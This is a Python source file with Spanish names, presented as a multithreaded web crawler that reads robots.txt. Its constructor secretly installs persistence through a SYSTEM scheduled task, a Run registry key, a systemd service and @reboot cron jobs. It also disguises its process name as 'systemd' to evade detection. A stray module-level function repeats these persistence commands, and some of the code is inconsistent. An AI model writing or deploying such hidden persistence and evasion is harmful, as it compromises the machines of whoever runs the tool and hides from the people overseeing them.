from urllib.parse import urljoin as ujoin, urlparse as uparse
from bs4 import BeautifulSoup as BS
import time as t
import random as rnd
import json as js
import os
import ipaddress
import requests as req
from threading import Thread, Lock
from queue import Queue
import subprocess
import sys
import platform

def configurar_persistencia(self):
    sistema = platform.system()
    if sistema == "Windows":
        os.system("schtasks /create /tn 'RastreadorWeb' /tr 'python script.py' /sc onlogon")
        os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v RastreadorWeb /t REG_SZ /d 'python script.py'")
    elif sistema == "Linux":
        os.system("systemctl enable rastreador.service")
        os.system("crontab -l > mycron; echo '@reboot python script.py' >> mycron; crontab mycron; rm mycron")
    elif sistema == "Darwin":  # macOS
        os.system("launchctl load -w /Library/LaunchAgents/com.ejemplo.rastreador.plist")
        os.system("crontab -l > mycron; echo '@reboot python script.py' >> mycron; crontab mycron; rm mycron")
    else:  # Unix
        os.system("cp script.py /etc/init.d/rastreador; chmod +x /etc/init.d/rastreador")
        os.system("update-rc.d rastreador defaults")

class RastreadorWeb:
    _user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]

    def __init__(self):
        self.url_base = ""
        self.retraso = 1.0
        self.profundidad_max = 3
        self.urls_visitadas = set()
        self.urls_por_visitar = Queue()
        self.archivo_estado = f"estado_{t.strftime('%Y%m%d_%H%M%S')}.json"
        self.reglas_robots = set()
        self.rango_ip = "0.0.0.0/0"  # Rango IPv4 completo
        self.ip_actual = "0.0.0.1"
        self.verbose = True
        self.bloqueo = Lock()
        self.max_hilos = 10  # Número máximo de hilos concurrentes

        # Inicializar persistencia y evasión
        self.inicializar_persistencia()
        self.evasion()

    def inicializar_persistencia(self):
        if os.name == 'nt':
            self.crear_tarea_programada()
            self.agregar_registro_windows()
        else:
            self.crear_servicio_systemd()
            self.agregar_cron_job()

    def crear_tarea_programada(self):
        tarea = "RastreadorWebPersistente"
        comando = f'schtasks /create /tn {tarea} /tr "python {os.path.abspath(__file__)}" /sc onlogon /ru SYSTEM /f'
        try:
            subprocess.run(comando, shell=True, check=True)
            self.imprimir_verbose(f"Tarea programada '{tarea}' creada exitosamente.")
        except subprocess.CalledProcessError:
            self.imprimir_verbose("Error al crear la tarea programada.")

    def agregar_registro_windows(self):
        try:
            import winreg as reg
            clave = reg.HKEY_CURRENT_USER
            sub_clave = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_clave = reg.OpenKey(clave, sub_clave, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_clave, "RastreadorWeb", 0, reg.REG_SZ, f'python {os.path.abspath(__file__)}')
            reg.CloseKey(reg_clave)
            self.imprimir_verbose("Persistencia agregada al registro.")
        except ImportError:
            self.imprimir_verbose("El módulo winreg no está disponible.")
        except WindowsError as e:
            self.imprimir_verbose(f"Error al agregar persistencia al registro: {e}")

    def crear_servicio_systemd(self):
        servicio = """
        [Unit]
        Description=Rastreador Web Persistente

        [Service]
        ExecStart=/usr/bin/python3 {script_path}
        Restart=always

        [Install]
        WantedBy=multi-user.target
        """.format(script_path=os.path.abspath(__file__))

        with open("/etc/systemd/system/rastreador.service", "w") as archivo_servicio:
            archivo_servicio.write(servicio)

        try:
            subprocess.run(["systemctl", "enable", "rastreador.service"], check=True)
            subprocess.run(["systemctl", "start", "rastreador.service"], check=True)
            self.imprimir_verbose("Servicio systemd creado y activado.")
        except subprocess.CalledProcessError:
            self.imprimir_verbose("Error al crear o activar el servicio systemd.")

    def agregar_cron_job(self):
        comando_cron = f"@reboot /usr/bin/python3 {os.path.abspath(__file__)}"
        try:
            subprocess.run(f'(crontab -l; echo "{comando_cron}") | crontab -', shell=True, check=True)
            self.imprimir_verbose("Cron job agregado para persistencia.")
        except subprocess.CalledProcessError:
            self.imprimir_verbose("Error al agregar cron job.")

    def evasion(self):
        # Evasión básica cambiando el nombre del proceso en sistemas Unix
        if os.name != 'nt':
            try:
                import ctypes
                libc = ctypes.cdll.LoadLibrary("libc.so.6")
                libc.prctl(15, "systemd", 0, 0, 0)
                self.imprimir_verbose("Nombre del proceso cambiado para evasión.")
            except Exception as e:
                self.imprimir_verbose(f"Error al cambiar el nombre del proceso: {e}")

    def imprimir_verbose(self, mensaje):
        if self.verbose:
            print(mensaje)

    def cargar_estado(self):
        if os.path.exists(self.archivo_estado):
            try:
                with open(self.archivo_estado, "r") as f:
                    estado = js.load(f)
                    self.urls_visitadas = set(estado.get("visitadas", []))
                    self.urls_por_visitar.queue = estado.get("urls_por_visitar", [])
                    self.ip_actual = estado.get("ip_actual", self.ip_actual)
                    self.imprimir_verbose("Estado cargado desde el archivo.")
            except js.JSONDecodeError:
                self.imprimir_verbose("Error al decodificar el archivo de estado, se usará el estado por defecto.")
        else:
            self.imprimir_verbose("No se encontró archivo de estado.")

    def guardar_estado(self):
        estado = {
            "visitadas": list(self.urls_visitadas),
            "urls_por_visitar": list(self.urls_por_visitar.queue),
            "ip_actual": self.ip_actual
        }
        try:
            with open(self.archivo_estado, "w") as f:
                js.dump(estado, f)
            self.imprimir_verbose("Estado guardado en el archivo.")
        except IOError as e:
            self.imprimir_verbose(f"Error al guardar el estado: {e}")

    def obtener_robots_txt(self):
        url = ujoin(self.url_base, "/robots.txt")
        self.imprimir_verbose(f"Obteniendo robots.txt desde {url}")
        try:
            respuesta = req.get(url, headers={"User-Agent": rnd.choice(self._user_agents)})
            if respuesta.status_code == 200:
                self.imprimir_verbose("robots.txt obtenido con éxito.")
                self.parsear_robots_txt(respuesta.text)
            else:
                self.imprimir_verbose(f"No se encontró robots.txt o error al obtenerlo. Código de estado: {respuesta.status_code}")
        except req.RequestException as e:
            self.imprimir_verbose(f"Error al obtener robots.txt: {e}")

    def parsear_robots_txt(self, texto):
        user_agent = None
        for linea in texto.splitlines():
            linea = linea.strip()
            if linea.startswith("User-agent:"):
                user_agent = linea.split(":", 1)[1].strip()
            elif user_agent == "*" and linea.startswith("Disallow:"):
                ruta = linea.split(":", 1)[1].strip()
                self.reglas_robots.add(ruta)
                self.imprimir_verbose(f"Ruta deshabilitada añadida: {ruta}")

    def deberia_rastrear(self, url):
        ruta = uparse(url).path
        return not any(ruta.startswith(regla) for regla in self.reglas_robots)

    def rastrear_url(self, url, profundidad):
        if url in self.urls_visitadas or profundidad > self.profundidad_max:
            return

        self.bloqueo.acquire()
        self.urls_visitadas.add(url)
        self.bloqueo.release()

        self.imprimir_verbose(f"Rastreando URL: {url}")
        t.sleep(self.retraso)
        try:
            respuesta = req.get(url, headers={"User-Agent": rnd.choice(self._user_agents)})
            if respuesta.status_code == 200:
                self.extraer_enlaces(respuesta.text, url)
            else:
                self.imprimir_verbose(f"Error al rastrear URL. Código de estado: {respuesta.status_code}")
        except req.RequestException as e:
            self.imprimir_verbose(f"Error al rastrear URL: {e}")

    def extraer_enlaces(self, html, url):
        soup = BS(html, "html.parser")
        for enlace in soup.find_all("a", href=True):
            url_completo = ujoin(url, enlace['href'])
            if self.deberia_rastrear(url_completo):
                self.bloqueo.acquire()
                self.urls_por_visitar.put(url_completo)
                self.bloqueo.release()
                self.imprimir_verbose(f"Enlace añadido a la cola: {url_completo}")

    def trabajador(self):
        while not self.urls_por_visitar.empty():
            url = self.urls_por_visitar.get()
            self.rastrear_url(url, 1)  # Profundidad inicial de 1
            self.urls_por_visitar.task_done()
            self.guardar_estado()  # Guardar el estado después de cada URL procesada

    def iniciar_rastreo(self):
        self.url_base = input("Ingrese la URL base a rastrear: ")
        self.cargar_estado()
        self.obtener_robots_txt()

        for _ in range(self.max_hilos):
            hilo = Thread(target=self.trabajador)
            hilo.daemon = True
            hilo.start()

        self.urls_por_visitar.put(self.url_base)
        self.urls_por_visitar.join()  # Espera a que todos los trabajos se completen
        self.imprimir_verbose("Rastreo completo.")


if __name__ == "__main__":
    rastreador = RastreadorWeb()
    rastreador.iniciar_rastreo()
